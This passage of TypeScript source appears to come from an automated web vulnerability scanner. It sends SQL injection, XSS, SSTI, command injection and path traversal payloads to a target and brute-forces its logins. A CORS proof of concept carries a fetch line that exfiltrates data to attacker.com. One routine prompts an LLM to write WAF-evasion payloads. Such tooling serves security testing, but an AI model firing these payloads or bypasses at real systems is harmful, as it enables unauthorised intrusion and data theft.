        const testUrl = new URL(path, target).toString();
        const response = await fetchWithTimeout(testUrl, 3000);
        if ([200, 301, 302].includes(response.status)) {
          if (!results.endpoints.includes(testUrl)) results.endpoints.push(testUrl);
          if (path.includes('api') || path.includes('graphql')) results.apiEndpoints.push(testUrl);
          if (path.includes('login') || path.includes('auth')) results.authEndpoints.push(testUrl);
        }
      } catch {}
    }));
  }

  // Shodan
  if (shodanKey) {
    try {
      const shodanResp = await fetchWithTimeout(`https://api.shodan.io/dns/resolve?hostnames=${target.hostname}&key=${shodanKey}`, 8000);
      if (shodanResp.ok) {
        const shodanData = await shodanResp.json();
        const ip = shodanData[target.hostname];
        if (ip) {
          const hostResp = await fetchWithTimeout(`https://api.shodan.io/shodan/host/${ip}?key=${shodanKey}`, 8000);
          if (hostResp.ok) {
            const hostData = await hostResp.json();
            results.shodanData = { ip, ports: hostData.ports || [], vulns: hostData.vulns || [] };
            results.ports = hostData.ports || [];
            for (const port of (hostData.ports || [])) {
              if ([80, 443, 8080, 8443, 3000, 5000, 9090].includes(port)) {
                const proto = [443, 8443].includes(port) ? 'https' : 'http';
                const portUrl = `${proto}://${target.hostname}:${port}/`;
                if (!results.endpoints.includes(portUrl)) results.endpoints.push(portUrl);
              }
            }
          }
        }
      }
    } catch {}
  }

  results.endpoints = [...new Set(results.endpoints)];
  results.params = [...new Set(results.params)];
  return results;
}

// ═══════════════════════════════════════════════════════════════════════════════
// OWASP ENDPOINT ASSESSMENT — now receives ALL discovered params
// ═══════════════════════════════════════════════════════════════════════════════
async function assessEndpointOWASP(
  endpoint: string, fingerprint: any, payloads: Record<string, string[]>,
  failedPayloads: string[], discoveredParams: string[], phaseStart: number, scanStart: number
): Promise<Finding[]> {
  const findings: Finding[] = [];
  if (isPhaseExpired('owasp_scan', phaseStart, scanStart)) return findings;

  try {
    const response = await fetchWithTimeout(endpoint, 8000);
    const status = response.status;
    const responseText = await response.text();

    // A01: Sensitive file exposure
    if ((endpoint.includes('.git') || endpoint.includes('.env') || endpoint.includes('.svn') || endpoint.includes('.htpasswd') || endpoint.includes('Dockerfile') || endpoint.includes('package.json') || endpoint.includes('composer.json')) && status === 200) {
      const hasContent = responseText.includes('[') || responseText.includes('=') || responseText.includes('{');
      if (hasContent && responseText.length > 20) {
        findings.push({
          id: `A01-EXPOSURE-${Date.now()}`, severity: 'critical',
          title: `Sensitive File: ${endpoint.split('/').pop()}`,
          description: 'Critical file publicly accessible.',
          endpoint, method: 'GET', owasp: 'A01:2021',
          evidence: `HTTP ${status} — ${responseText.slice(0, 150)}`,
          evidence2: 'Config patterns confirmed', dualConfirmed: true, exploitValidated: true,
          remediation: 'Block access via server config.',
          cwe: 'CWE-200', cvss: 9.0, mitre: ['T1552'], confidence: 96, category: 'access_control',
          poc: `curl -s "${endpoint}" | head -20`
        });
      }
    }

    // Admin panel
    if ((endpoint.includes('admin') || endpoint.includes('debug') || endpoint.includes('console') || endpoint.includes('phpinfo') || endpoint.includes('phpmyadmin')) && status === 200 && responseText.length > 200) {
      findings.push({
        id: `A01-ADMIN-${Date.now()}`, severity: 'high',
        title: `Admin Panel: ${endpoint.split('/').pop()}`,
        description: 'Admin interface accessible.',
        endpoint, method: 'GET', owasp: 'A01:2021',
        evidence: `HTTP ${status}, ${responseText.length}b`, evidence2: 'URL+200 confirmed',
        dualConfirmed: true, remediation: 'Implement auth for admin panels.',
        cwe: 'CWE-306', cvss: 7.5, confidence: 85, category: 'access_control',
      });
    }

    // A02: No TLS
    if (!endpoint.startsWith('https://')) {
      findings.push({
        id: `A02-NOSSL-${Date.now()}`, severity: 'high',
        title: 'No TLS/SSL',
        description: 'Plaintext traffic.',
        endpoint, owasp: 'A02:2021', evidence: 'HTTP', evidence2: 'No HTTPS redirect',
        dualConfirmed: true, remediation: 'Implement HTTPS.',
        cwe: 'CWE-319', cvss: 7.4, confidence: 100, category: 'crypto',
      });
    }

    // A03: Injection — use ALL discovered params + URL params
    const parsedUrl = new URL(endpoint);
    const existingParams = Array.from(parsedUrl.searchParams.keys());
    // Combine endpoint params + discovered params + common params (no artificial limit)
    const commonParams = ['id', 'cat', 'page', 'search', 'q', 'query', 'file', 'name', 'user', 'item',
      'product', 'category', 'artist', 'title', 'sort', 'order', 'dir', 'lang', 'type', 'action',
      'url', 'path', 'redirect', 'return', 'callback', 'ref', 'template', 'view', 'cmd', 'exec',
      'input', 'data', 'content', 'text', 'value', 'key', 'token', 'param', 'arg', 'target'];
    const allParams = [...new Set([...existingParams, ...discoveredParams, ...commonParams])];

    const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'sql error',
      'syntax error', 'unclosed quotation', 'warning: mysql', 'you have an error in your sql',
      'microsoft sql', 'mysql_num_rows', 'sqlstate', 'pdoexception', 'mysql_connect',
      'java.sql.sqlexception', 'org.hibernate', 'unknown column', 'query failed',
      'valid mysql result', 'pdo::__construct', 'unterminated string'];

    for (const param of allParams) {
      if (isPhaseExpired('owasp_scan', phaseStart, scanStart)) break;

      // Error-based SQLi
      try {
        const baseUrl = new URL(endpoint); baseUrl.searchParams.set(param, '1');
        const baseResp = await fetchWithTimeout(baseUrl.toString(), 5000);
        const baseBody = await baseResp.text();
        const baseLen = baseBody.length;

        const sqliUrl1 = new URL(endpoint); sqliUrl1.searchParams.set(param, "'\"");
        const sqliResp1 = await fetchWithTimeout(sqliUrl1.toString(), 5000);
        const sqliBody1 = await sqliResp1.text();
        const hasError1 = sqlErrors.some(e => sqliBody1.toLowerCase().includes(e));

        if (hasError1) {
          const sqliUrl2 = new URL(endpoint); sqliUrl2.searchParams.set(param, "' OR '1'='1");
          const sqliResp2 = await fetchWithTimeout(sqliUrl2.toString(), 5000);
          const sqliBody2 = await sqliResp2.text();
          const hasError2 = sqlErrors.some(e => sqliBody2.toLowerCase().includes(e));
          const responseChanged = Math.abs(sqliBody2.length - baseLen) > 50;

          if (hasError2 || responseChanged) {
            findings.push({
              id: `A03-SQLI-${Date.now()}-${param}`, severity: 'critical',
              title: `SQL Injection in "${param}" [EXPLOIT-VALIDATED]`,
              description: `SQL error + response change in "${param}".`,
              endpoint: sqliUrl1.toString(), method: 'GET', owasp: 'A03:2021', payload: "'\"",
              evidence: `Error: ${sqliBody1.slice(0, 200)}`,
              evidence2: `Second probe: ${hasError2 ? 'error' : 'length change'} (base=${baseLen}, injected=${sqliBody2.length})`,
              dualConfirmed: true, exploitValidated: true,
              remediation: 'Use parameterized queries.',
              cwe: 'CWE-89', cvss: 9.8, mitre: ['T1190'], confidence: 97, category: 'injection',
              poc: `# Step 1: Trigger SQL error\ncurl -s "${sqliUrl1.toString()}"\n\n# Step 2: Confirm with boolean\ncurl -s "${sqliUrl2.toString()}"\n\n# Step 3: Extract version\ncurl -s "${new URL(endpoint).origin}${new URL(endpoint).pathname}?${param}=' UNION SELECT NULL,VERSION(),NULL--"`
            });
            continue;
          }
        }

        // Boolean-based blind SQLi
        const trueUrl = new URL(endpoint); trueUrl.searchParams.set(param, "1 AND 1=1");
        const falseUrl = new URL(endpoint); falseUrl.searchParams.set(param, "1 AND 1=2");
        const [trueResp, falseResp] = await Promise.all([
          fetchWithTimeout(trueUrl.toString(), 5000).then(r => r.text()).catch(() => ''),
          fetchWithTimeout(falseUrl.toString(), 5000).then(r => r.text()).catch(() => '')
        ]);

        if (trueResp && falseResp && trueResp.length > 100) {
          const trueDiff = Math.abs(trueResp.length - baseLen);
          const falseDiff = Math.abs(falseResp.length - baseLen);
          if (trueDiff < 50 && falseDiff > 100) {
            const true2Url = new URL(endpoint); true2Url.searchParams.set(param, "1 OR 1=1");
            const true2Resp = await fetchWithTimeout(true2Url.toString(), 5000).then(r => r.text()).catch(() => '');
            if (true2Resp && Math.abs(true2Resp.length - trueResp.length) < 100) {
              findings.push({
                id: `A03-BSQLI-${Date.now()}-${param}`, severity: 'critical',
                title: `Blind SQLi in "${param}" [BOOLEAN-BASED]`,
                description: `TRUE (${trueResp.length}b) vs FALSE (${falseResp.length}b) vs baseline (${baseLen}b).`,
                endpoint: trueUrl.toString(), method: 'GET', owasp: 'A03:2021',
                payload: '1 AND 1=1 / 1 AND 1=2',
                evidence: `TRUE=${trueResp.length}b ≈ baseline ${baseLen}b`,
                evidence2: `FALSE=${falseResp.length}b differs (Δ=${falseDiff}b)`,
                dualConfirmed: true, exploitValidated: true,
                remediation: 'Use parameterized queries.',
                cwe: 'CWE-89', cvss: 9.8, mitre: ['T1190'], confidence: 90, category: 'injection',
              });
              continue;
            }
          }
        }

        // Time-based blind SQLi (statistical: 3 baseline samples)
        try {
          const timings: number[] = [];
          for (let t = 0; t < 3; t++) {
            const ts = Date.now();
            await fetchWithTimeout(baseUrl.toString(), 6000);
            timings.push(Date.now() - ts);
          }
          const avgNormal = timings.reduce((a, b) => a + b, 0) / timings.length;
          const maxNormal = Math.max(...timings);

          const sleepUrl = new URL(endpoint); sleepUrl.searchParams.set(param, "1' AND SLEEP(3)--");
          const sleepStart = Date.now();
          await fetchWithTimeout(sleepUrl.toString(), 10000);
          const sleepTime = Date.now() - sleepStart;

          if (sleepTime > maxNormal + 2500 && sleepTime - avgNormal > 2500) {
            // Confirm with WAITFOR
            const sleep2Url = new URL(endpoint); sleep2Url.searchParams.set(param, "1; WAITFOR DELAY '0:0:3'--");
            const sleep2Start = Date.now();
            await fetchWithTimeout(sleep2Url.toString(), 10000);
            const sleep2Time = Date.now() - sleep2Start;
            const confirmed = sleep2Time > maxNormal + 2000;

            findings.push({
              id: `A03-TSQLI-${Date.now()}-${param}`, severity: 'critical',
              title: `Time-Based Blind SQLi in "${param}" ${confirmed ? '[DUAL-CONFIRMED]' : ''}`,
              description: `SLEEP(3) delayed by ${Math.round(sleepTime - avgNormal)}ms (avg baseline: ${Math.round(avgNormal)}ms).`,
              endpoint: sleepUrl.toString(), method: 'GET', owasp: 'A03:2021',
              payload: "1' AND SLEEP(3)--",
              evidence: `Baseline avg: ${Math.round(avgNormal)}ms (max: ${Math.round(maxNormal)}ms), SLEEP: ${sleepTime}ms`,
              evidence2: confirmed ? `WAITFOR: ${sleep2Time}ms` : 'Single confirmation',
              dualConfirmed: confirmed, exploitValidated: true,
              remediation: 'Use parameterized queries.',
              cwe: 'CWE-89', cvss: 9.8, mitre: ['T1190'], confidence: confirmed ? 95 : 80, category: 'injection',
            });
            continue;
          }
        } catch {}
      } catch {}

      // XSS dual-confirm
      const xssPayloads = payloads.a03_xss || [];
      if (xssPayloads.length >= 2) {
        try {
          const xssUrl1 = new URL(endpoint); xssUrl1.searchParams.set(param, xssPayloads[0]);
          const xssResp1 = await fetchWithTimeout(xssUrl1.toString(), 5000);
          const xssBody1 = await xssResp1.text();
          const reflected1 = xssBody1.includes(xssPayloads[0]) || (xssBody1.includes('onerror=') && !responseText.includes('onerror='));

          if (reflected1) {
            const xssUrl2 = new URL(endpoint); xssUrl2.searchParams.set(param, xssPayloads[1]);
            const xssResp2 = await fetchWithTimeout(xssUrl2.toString(), 5000);
            const xssBody2 = await xssResp2.text();
            const reflected2 = xssBody2.includes(xssPayloads[1]) || (xssBody2.includes('onload=') && !responseText.includes('onload='));

            if (reflected2) {
              findings.push({
                id: `A03-XSS-${Date.now()}-${param}`, severity: 'high',
                title: `Reflected XSS in "${param}" [EXPLOIT-VALIDATED]`,
                description: `Two XSS probes reflected.`,
                endpoint: xssUrl1.toString(), method: 'GET', owasp: 'A03:2021', payload: xssPayloads[0],
                evidence: `Probe 1 reflected`, evidence2: `Probe 2 reflected`,
                dualConfirmed: true, exploitValidated: true,
                remediation: 'Output encoding + CSP.',
                cwe: 'CWE-79', cvss: 6.1, mitre: ['T1059.007'], confidence: 96, category: 'injection',
              });
              continue;
            }
          }

          if (reflected1) {
            findings.push({
              id: `A03-XSS-S-${Date.now()}-${param}`, severity: 'medium',
              title: `Potential XSS in "${param}"`,
              description: `Single XSS probe reflected.`,
              endpoint: xssUrl1.toString(), method: 'GET', owasp: 'A03:2021', payload: xssPayloads[0],
              evidence: 'Payload reflected', remediation: 'Output encoding + CSP.',
              cwe: 'CWE-79', cvss: 6.1, confidence: 70, category: 'injection',
            });
          }
        } catch {}
      }

      // SSTI
      try {
        const sstiUrl = new URL(endpoint); sstiUrl.searchParams.set(param, '{{7*7}}');
        const sstiResp = await fetchWithTimeout(sstiUrl.toString(), 5000);
        const sstiBody = await sstiResp.text();
        if (sstiBody.includes('49') && !responseText.includes('49')) {
          const sstiUrl2 = new URL(endpoint); sstiUrl2.searchParams.set(param, '{{7*191}}');
          const sstiResp2 = await fetchWithTimeout(sstiUrl2.toString(), 5000);
          const sstiBody2 = await sstiResp2.text();
          if (sstiBody2.includes('1337')) {
            findings.push({
              id: `A03-SSTI-${Date.now()}-${param}`, severity: 'critical',
              title: `SSTI in "${param}" [EXPLOIT-VALIDATED]`,
              description: '{{7*7}}→49 and {{7*191}}→1337.',
              endpoint: sstiUrl.toString(), method: 'GET', owasp: 'A03:2021', payload: '{{7*7}}',
              evidence: '{{7*7}}=49', evidence2: '{{7*191}}=1337',
              dualConfirmed: true, exploitValidated: true,
              remediation: 'Use sandboxed templates.',
              cwe: 'CWE-94', cvss: 9.8, confidence: 98, category: 'injection',
            });
          }
        }
      } catch {}

      // CMDi
      try {
        for (const cmd of (payloads.a03_cmdi || []).slice(0, 3)) {
          const cmdUrl = new URL(endpoint); cmdUrl.searchParams.set(param, cmd);
          const cmdResp = await fetchWithTimeout(cmdUrl.toString(), 5000);
          const cmdBody = await cmdResp.text();
          if ((cmdBody.includes('uid=') && cmdBody.includes('gid=')) ||
            (cmdBody.includes('root:') && cmdBody.includes('/bin'))) {
            findings.push({
              id: `A03-CMDI-${Date.now()}-${param}`, severity: 'critical',
              title: `Command Injection in "${param}" [EXPLOIT-VALIDATED]`,
              description: `OS command output detected.`,
              endpoint: cmdUrl.toString(), method: 'GET', owasp: 'A03:2021', payload: cmd,
              evidence: cmdBody.slice(0, 200), dualConfirmed: true, exploitValidated: true,
              remediation: 'Never pass user input to shell.',
              cwe: 'CWE-78', cvss: 9.8, mitre: ['T1059'], confidence: 98, category: 'injection',
            });
            break;
          }
        }
      } catch {}
    }

    // A05: Security headers
    const secHeaders: Record<string, string> = {
      'x-frame-options': 'X-Frame-Options', 'x-content-type-options': 'X-Content-Type-Options',
      'strict-transport-security': 'Strict-Transport-Security',
      'content-security-policy': 'Content-Security-Policy',
    };
    for (const [header, name] of Object.entries(secHeaders)) {
      if (!response.headers.get(header)) {
        findings.push({
          id: `A05-${header.toUpperCase()}-${Date.now()}`, severity: header === 'content-security-policy' ? 'medium' : 'low',
          title: `Missing ${name}`, description: `${name} header not set.`,
          endpoint, owasp: 'A05:2021', evidence: 'Header absent', evidence2: 'Confirmed',
          dualConfirmed: true, remediation: `Add ${name} header.`,
          cwe: 'CWE-693', confidence: 100, category: 'misconfig',
        });
      }
    }

    const serverHeader = response.headers.get('server');
    if (serverHeader && serverHeader.match(/[0-9]+\.[0-9]+/)) {
      findings.push({
        id: `A05-SVR-${Date.now()}`, severity: 'low',
        title: `Server Disclosure: ${serverHeader}`, description: `Server: "${serverHeader}"`,
        endpoint, owasp: 'A05:2021', evidence: `Server: ${serverHeader}`,
        dualConfirmed: true, remediation: 'Remove Server header', cwe: 'CWE-200', confidence: 100, category: 'misconfig'
      });
    }

    // A06: Outdated components
    const versionMatch = responseText.match(/(jQuery|Bootstrap|Angular|React|Vue)\/([0-9]+\.[0-9]+\.[0-9]+)/i);
    if (versionMatch) {
      findings.push({
        id: `A06-OUTDATED-${Date.now()}`, severity: 'medium',
        title: `Outdated: ${versionMatch[1]} v${versionMatch[2]}`,
        description: `${versionMatch[1]} ${versionMatch[2]} may have known CVEs.`,
        endpoint, owasp: 'A06:2021', evidence: versionMatch[0],
        remediation: `Update ${versionMatch[1]}.`, cwe: 'CWE-1104', confidence: 88, category: 'components'
      });
    }

    // A09: Verbose errors
    if (responseText.match(/(?:fatal error|stack trace|traceback|pg_query|mysqli_query)/i) && status >= 400) {
      findings.push({
        id: `A09-ERR-${Date.now()}`, severity: 'medium',
        title: 'Verbose Error Disclosure', description: 'Error details leaked.',
        endpoint, owasp: 'A09:2021', evidence: 'Error patterns', evidence2: `HTTP ${status}`,
        dualConfirmed: true, remediation: 'Disable debug mode.',
        cwe: 'CWE-209', confidence: 88, category: 'logging',
      });
    }

    // Directory listing
    if ((responseText.includes('Index of /') || responseText.includes('<title>Index of')) && status === 200) {
      findings.push({
        id: `A05-DIRLIST-${Date.now()}`, severity: 'medium',
        title: 'Directory Listing Enabled', description: 'Server exposes directory.',
        endpoint, owasp: 'A05:2021', evidence: '"Index of /"', evidence2: 'HTTP 200',
        dualConfirmed: true, exploitValidated: true, remediation: 'Options -Indexes.',
        cwe: 'CWE-548', confidence: 96, category: 'misconfig',
      });
    }

  } catch {}
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CORS, TRAVERSAL, COOKIE SCANNERS
// ═══════════════════════════════════════════════════════════════════════════════
async function scanCORS(targetUrl: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const origins = ['https://evil.com', 'https://attacker.com', 'null'];
  for (const origin of origins) {
    try {
      const optResp = await fetchWithTimeout(targetUrl, 6000, { method: 'OPTIONS', headers: { 'Origin': origin, 'Access-Control-Request-Method': 'GET' } });
      const acao = optResp.headers.get('access-control-allow-origin');
      const acac = optResp.headers.get('access-control-allow-credentials');
      const getResp = await fetchWithTimeout(targetUrl, 6000, { headers: { 'Origin': origin } });
      const acao2 = getResp.headers.get('access-control-allow-origin');

      if ((acao === origin || acao === '*') && (acao2 === origin || acao2 === '*')) {
        const withCreds = acac === 'true';
        findings.push({
          id: `CORS-${Date.now()}`, severity: withCreds ? 'critical' : 'high',
          title: 'CORS: Arbitrary Origin Reflected', owasp: 'A05:2021',
          description: `Reflects "${origin}". ${withCreds ? 'Credentials → theft.' : 'Data exfil possible.'}`,
          endpoint: targetUrl, method: 'GET', payload: `Origin: ${origin}`,
          evidence: `OPTIONS ACAO: ${acao}`, evidence2: `GET ACAO: ${acao2}`,
          dualConfirmed: true, exploitValidated: true, remediation: 'Whitelist origins.',
          cwe: 'CWE-346', cvss: withCreds ? 9.3 : 7.4, confidence: 95, category: 'cors',
          poc: `# CORS POC\ncurl -sI "${targetUrl}" -H "Origin: ${origin}" | grep -i access-control\n\n# JS exploit:\nfetch("${targetUrl}",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://attacker.com/?d="+btoa(d)))`
        });
        break;
      }
    } catch {}
  }
  return findings;
}

async function scanDirectoryTraversal(targetUrl: string, params: string[]): Promise<Finding[]> {
  const findings: Finding[] = [];
  const payloads = ['../../../etc/passwd', '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '..%252F..%252F..%252Fetc%252Fpasswd', '..%c0%af..%c0%af..%c0%afetc/passwd'];
  const fileParams = [...new Set([...params, 'file', 'path', 'page', 'include', 'load', 'template', 'doc', 'read', 'img', 'src', 'document', 'folder', 'root', 'filename'])];

  for (const param of fileParams) {
    for (const payload of payloads) {
      try {
        const testUrl = new URL(targetUrl); testUrl.searchParams.set(param, payload);
        const resp = await fetchWithTimeout(testUrl.toString(), 6000);
        const body = await resp.text();
        if (body.includes('root:x:0:0') || body.includes('/bin/bash') || body.toLowerCase().includes('[extensions]')) {
          findings.push({
            id: `TRAV-${Date.now()}-${param}`, severity: 'critical',
            title: `Path Traversal in "${param}" [EXPLOIT-VALIDATED]`,
            description: `File content leaked via "${param}".`,
            endpoint: testUrl.toString(), method: 'GET', payload, owasp: 'A01:2021',
            evidence: body.slice(0, 200), dualConfirmed: true, exploitValidated: true,
            remediation: 'Validate file paths.', cwe: 'CWE-22', cvss: 9.3,
            mitre: ['T1083'], confidence: 97, category: 'traversal',
            poc: `curl -s "${testUrl.toString()}" | head -20`
          });
          break;
        }
      } catch {}
    }
  }
  return findings;
}

async function scanCookieSecurity(targetUrl: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  try {
    const resp = await fetchWithTimeout(targetUrl, 8000);
    const cookieHeader = resp.headers.get('set-cookie');
    if (!cookieHeader) return findings;
    const bodyText = await resp.text().catch(() => '');
    const cookies = cookieHeader.split(/,(?=[^;])/);
    const isHTTPS = targetUrl.startsWith('https');
    const hasScripts = /<script[^>]*>[^<]{10,}/i.test(bodyText);

    for (const cookie of cookies) {
      const cookieLower = cookie.toLowerCase();
      const cookieName = cookie.split('=')[0].trim();
      if (!cookieLower.includes('httponly')) {
        findings.push({
          id: `COOKIE-NOHTTP-${Date.now()}-${cookieName.slice(0, 10)}`, severity: hasScripts ? 'high' : 'medium',
          title: `Cookie "${cookieName}" Missing HttpOnly`, owasp: 'A05:2021',
          description: `JS-accessible. ${hasScripts ? 'Inline scripts = theft risk.' : ''}`,
          endpoint: targetUrl, evidence: cookie.slice(0, 150),
          evidence2: hasScripts ? 'Inline scripts confirm' : 'No XSS vector',
          dualConfirmed: hasScripts, remediation: 'Add HttpOnly.',
          cwe: 'CWE-1004', cvss: hasScripts ? 7.4 : 5.4, confidence: hasScripts ? 88 : 72, category: 'cookie',
        });
      }
      if (!cookieLower.includes('; secure') && isHTTPS) {
        findings.push({
          id: `COOKIE-NOSEC-${Date.now()}-${cookieName.slice(0, 10)}`, severity: 'medium',
          title: `Cookie "${cookieName}" Missing Secure`, owasp: 'A02:2021',
          description: 'Cookie transmittable over HTTP.',
          endpoint: targetUrl, evidence: cookie.slice(0, 150), evidence2: 'HTTPS, no Secure',
          dualConfirmed: true, remediation: 'Add Secure.',
          cwe: 'CWE-614', cvss: 6.5, confidence: 90, category: 'cookie'
        });
      }
      if (!cookieLower.includes('samesite')) {
        findings.push({
          id: `COOKIE-NOSS-${Date.now()}-${cookieName.slice(0, 10)}`, severity: 'medium',
          title: `Cookie "${cookieName}" Missing SameSite`, owasp: 'A01:2021',
          description: 'CSRF vulnerability.',
          endpoint: targetUrl, evidence: cookie.slice(0, 150), evidence2: 'SameSite absent',
          dualConfirmed: true, remediation: 'Add SameSite=Strict.',
          cwe: 'CWE-352', cvss: 5.4, confidence: 92, category: 'cookie',
        });
      }
    }
  } catch {}
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// DEEP INJECTION WITH MUTATION (5x adaptive retries)
// ═══════════════════════════════════════════════════════════════════════════════
async function performDeepInjectionWithMutation(
  target: URL, forms: any[], params: string[],
  payloads: Record<string, string[]>, failedPayloads: string[],
  apiKey: string | undefined, phaseStart: number, scanStart: number
): Promise<Finding[]> {
  const findings: Finding[] = [];
  const MAX_RETRIES = 5;
  const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'sql error',
    'syntax error', 'unclosed quotation', 'warning: mysql', 'you have an error in your sql'];

  const mutatePayload = async (original: string, context: string, reason: string): Promise<string> => {
    if (apiKey) {
      try {
        const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
          method: "POST",
          headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
          body: JSON.stringify({
            model: "google/gemini-2.5-flash",
            messages: [
              { role: "system", content: "Expert pentester. Generate ONE WAF-evasion payload. Output ONLY the raw payload." },
              { role: "user", content: `Original: '${original}' blocked on ${context}. Reason: ${reason}. Generate obfuscated equivalent.` }
            ],
            temperature: 0.9, max_tokens: 150,
          }),
        });
        if (resp.ok) {
          const data = await resp.json();
          const content = (data.choices?.[0]?.message?.content || '').trim().replace(/^[`'"]+|[`'"]+$/g, '');
          if (content && content.length > 2 && content.length < 500 && !content.startsWith('```')) return content;
        }
      } catch {}
    }
    const techniques = [
      (p: string) => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(''),
      (p: string) => p.replace(/ /g, '/**/'),
      (p: string) => p.replace(/ /g, '%09'),
      (p: string) => p.replace(/[<>"']/g, c => '%25' + c.charCodeAt(0).toString(16)),
    ];
    return techniques[Math.floor(Math.random() * techniques.length)](original);
  };

  const fireWithRetry = async (
    url: string, param: string, initialPayload: string, method: string, inputName: string
  ): Promise<Finding | null> => {
    let currentPayload = initialPayload;
    for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
      if (isPhaseExpired('injection', phaseStart, scanStart)) return null;
      try {
        let response: Response;
        if (method === 'GET') {
          const testUrl = new URL(url); testUrl.searchParams.set(param, currentPayload);
          response = await fetchWithTimeout(testUrl.toString(), 6000);
        } else {
          const formData = new URLSearchParams(); formData.set(param, currentPayload);
          response = await fetchWithTimeout(url, 6000, {
            method: 'POST', headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formData.toString()
          });
        }

        const responseText = await response.text();
        const status = response.status;
        const blocked = status === 403 || status === 406 || status === 429 ||
          responseText.toLowerCase().includes('blocked') || responseText.toLowerCase().includes('waf');

        if (!blocked) {
          const lowerBody = responseText.toLowerCase();
          if (responseText.includes(currentPayload) || responseText.includes('onerror=') || responseText.includes('onload=')) {
            return {
              id: `MUT-XSS-${Date.now()}-${param}`, severity: 'high',
              title: `XSS in "${inputName}" ${attempt > 0 ? `[WAF Bypassed ×${attempt + 1}]` : '[EXPLOIT-VALIDATED]'}`,
              description: `Payload reflected${attempt > 0 ? ` after ${attempt + 1} mutations.` : '.'}`,
              endpoint: url, method, payload: currentPayload, owasp: 'A03:2021',
              evidence: `Reflected: ${currentPayload.slice(0, 100)}`,
              evidence2: attempt > 0 ? `Original blocked → mutated` : undefined,
              dualConfirmed: attempt > 0, exploitValidated: true,
              remediation: 'Output encoding + CSP.',
              cwe: 'CWE-79', cvss: 6.1, confidence: attempt > 0 ? 95 : 85, category: 'injection',
              retryCount: attempt + 1,
            };
          }
          if (sqlErrors.some(e => lowerBody.includes(e))) {
            return {
              id: `MUT-SQLI-${Date.now()}-${param}`, severity: 'critical',
              title: `SQLi in "${inputName}" ${attempt > 0 ? '[WAF Bypassed]' : '[EXPLOIT-VALIDATED]'}`,
              description: `SQL error triggered${attempt > 0 ? ` after ${attempt + 1} mutations.` : '.'}`,
              endpoint: url, method, payload: currentPayload, owasp: 'A03:2021',
              evidence: responseText.slice(0, 150),
              evidence2: attempt > 0 ? `Mutated from "${initialPayload}"` : undefined,
              dualConfirmed: true, exploitValidated: true,
              remediation: 'Parameterized queries.',
              cwe: 'CWE-89', cvss: 9.8, confidence: 97, category: 'injection',
              retryCount: attempt + 1,
            };
          }
          return null;
        }

        if (attempt >= MAX_RETRIES) return null;
        currentPayload = await mutatePayload(currentPayload, `${url} param=${param}`, `HTTP ${status}`);
        await new Promise(r => setTimeout(r, 800 + Math.random() * 1200));
      } catch {
        if (attempt >= MAX_RETRIES) return null;
        currentPayload = await mutatePayload(currentPayload, url, 'Connection error');
        await new Promise(r => setTimeout(r, 800 + Math.random() * 1200));
      }
    }
    return null;
  };

  // Test ALL forms with both GET and POST
  for (const form of (forms || [])) {
    if (isPhaseExpired('injection', phaseStart, scanStart)) break;
    const formUrl = form.action ? new URL(form.action, target).toString() : target.toString();
    for (const input of form.inputs) {
      if (isPhaseExpired('injection', phaseStart, scanStart)) break;
      for (const payload of (payloads.a03_xss || []).slice(0, 5)) {
        if (failedPayloads.includes(payload)) continue;
        const finding = await fireWithRetry(formUrl, input.name, payload, form.method || 'GET', input.name);
        if (finding) { findings.push(finding); break; }
      }
      for (const payload of (payloads.a03_sqli || []).slice(0, 5)) {
        if (failedPayloads.includes(payload)) continue;
        const finding = await fireWithRetry(formUrl, input.name, payload, form.method || 'GET', input.name);
        if (finding) { findings.push(finding); break; }
      }
    }
  }

  // Test URL params with SSRF
  for (const param of (params || [])) {
    if (isPhaseExpired('injection', phaseStart, scanStart)) break;
    for (const payload of (payloads.a10_ssrf || []).slice(0, 4)) {
      const finding = await fireWithRetry(target.toString(), param, payload, 'GET', param);
      if (finding) { findings.push(finding); break; }
    }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// AUTH + BUSINESS LOGIC
// ═══════════════════════════════════════════════════════════════════════════════
async function testAuthentication(target: URL, authEndpoints: string[], phaseStart: number, scanStart: number): Promise<Finding[]> {
  const findings: Finding[] = [];
  const endpoints = authEndpoints?.length > 0 ? authEndpoints :
    ['/login', '/signin', '/auth', '/api/login'].map(p => new URL(p, target).toString());

  for (const endpoint of endpoints.slice(0, 4)) {
    if (isPhaseExpired('auth', phaseStart, scanStart)) break;
    try {
      let blockedAt = 0;
      for (let i = 0; i < 12; i++) {
        try {
          const resp = await fetchWithTimeout(endpoint, 4000, {
            method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `username=admin&password=attempt${i}`
          });
          if (resp.status === 429 || resp.status === 423) { blockedAt = i + 1; break; }
        } catch { break; }
      }
      if (blockedAt === 0) {
        findings.push({
          id: `A07-BRUTE-${Date.now()}`, severity: 'high',
          title: 'No Brute Force Protection', owasp: 'A07:2021',
          description: '12+ failed logins without rate limit.',
          endpoint, method: 'POST', evidence: 'No 429 after 12 attempts',
          evidence2: 'Continued accepting', dualConfirmed: true, exploitValidated: true,
          remediation: 'Rate limiting + lockout.',
          cwe: 'CWE-307', cvss: 7.5, mitre: ['T1110'], confidence: 88, category: 'auth',
        });
      }

      const [resp1, resp2] = await Promise.all([
        fetchWithTimeout(endpoint, 5000, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=admin&password=wrong' }).catch(() => null),
        fetchWithTimeout(endpoint, 5000, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=nonexistent99&password=wrong' }).catch(() => null)
      ]);
      if (resp1 && resp2) {
        const b1 = (await resp1.text()).toLowerCase();
        const b2 = (await resp2.text()).toLowerCase();
